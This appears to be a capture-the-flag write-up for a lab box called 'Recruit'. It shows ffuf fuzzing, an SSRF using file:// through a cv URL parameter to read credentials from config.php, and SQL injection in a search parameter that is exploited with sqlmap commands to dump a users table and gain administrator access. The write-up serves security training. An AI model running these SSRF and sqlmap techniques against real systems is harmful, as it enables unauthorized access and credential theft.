# Recruit

<figure><img src="../.gitbook/assets/image (793).png" alt=""><figcaption></figcaption></figure>



## RECON

first I try to fuzzing&#x20;

```
ffuf -u http://10.49.149.6/FUZZ -w wl.txt
```

and I have some potential path

```
api.php                 [Status: 200, Size: 4151, Words: 1413, Lines: 108, Duration: 100ms]
assets/                 [Status: 200, Size: 2655, Words: 155, Lines: 25, Duration: 99ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 100ms]
file.php                [Status: 200, Size: 20, Words: 3, Lines: 1, Duration: 100ms]
index.php               [Status: 200, Size: 1417, Words: 283, Lines: 49, Duration: 105ms]
mail                    [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 99ms]
mail/                   [Status: 200, Size: 933, Words: 64, Lines: 17, Duration: 100ms]
server-status/          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 102ms]
phpmyadmin/             [Status: 200, Size: 14773, Words: 2348, Lines: 221, Duration: 3049ms]
```



when I access to `/mail`  I see `mail.log` it is a hint to solve

<figure><img src="../.gitbook/assets/image (794).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (795).png" alt=""><figcaption></figcaption></figure>



```
As discussed during deployment:
- HR login credentials (username: hr) are currently stored in the application
  configuration file (config.php) for ease of access during
  the initial rollout phase.
- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.
```

⇒ username normal user is : `hr` and password is stored in `config.php`

⇒ cred of admin store in database



and I read data in `api.php`

<figure><img src="../.gitbook/assets/image (796).png" alt=""><figcaption></figcaption></figure>

`GET /file.php?cv=<URL> HTTP/1.1`&#x20;

the untrusted data is url , I think it maybe SSRF

And I try with scheme `file://` to read file and I found passwd of user `hr`

<figure><img src="../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

And the next I see it

<figure><img src="../.gitbook/assets/image (799).png" alt=""><figcaption></figcaption></figure>

when I inject quote character , it raise error , so I can cf it is SQLi

<figure><img src="../.gitbook/assets/image (800).png" alt=""><figcaption></figcaption></figure>

The parameter `search` appears to be vulnerable to SQL injection.

When testing with special characters such as `'`, the application response changes, indicating a possible SQL query break.

Additionally, the input is reflected in the response, which suggests it may be directly used in a backend query.



After confirming the SQL injection , I used sqlmap to automate the exploitation process and speed up data extraction.

```bash
sqlmap -u "http://10.49.149.6/dashboard.php?search=a" \
--cookie="PHPSESSID=qq52ue4uam2tpa9rottclkg5je" \
-p search \
--batch --dbs
```

```bash
[16:05:29] [INFO] fetching database names
available databases [6]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] recruit_db
[*] sys
```

I see db `recruit_db`  can be store cred of admin so , I was dump this db

```bash
sqlmap -u "http://10.49.149.6/dashboard.php?search=a" \
--cookie="PHPSESSID=qq52ue4uam2tpa9rottclkg5je" \
-D recruit_db \
--dump --batch
```



```bash
Database: recruit_db
Table: users
[1 entry]
+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | <xxxxxxxxxxxx> | admin    |
+----+----------------+----------+

[16:07:31] [INFO] table 'recruit_db.users' dumped to CSV file '/home/canhieu/.local/share/sqlmap/output/10.49.149.6/dump/recruit_db/users.csv'
[16:07:31] [INFO] fetching columns for table 'candidates' in database 'recruit_db'
[16:07:31] [INFO] fetching entries for table 'candidates' in database 'recruit_db'
Database: recruit_db
Table: candidates
[4 entries]
+----+---------------+--------------+--------------------+
| id | name          | status       | position           |
+----+---------------+--------------+--------------------+
| 1  | Alice Johnson | Approved     | Frontend Developer |
| 2  | Bob Smith     | Under Review | Backend Developer  |
| 3  | Charlie Brown | Rejected     | Security Analyst   |
| 4  | Diana Prince  | Selected     | HR Executive       |
+----+---------------+--------------+--------------------+
```

After extracting the credentials, I used them to log into the application as an administrator.

This allowed me to access restricted functionality and retrieve the flag.

<figure><img src="../.gitbook/assets/image (801).png" alt=""><figcaption></figcaption></figure>
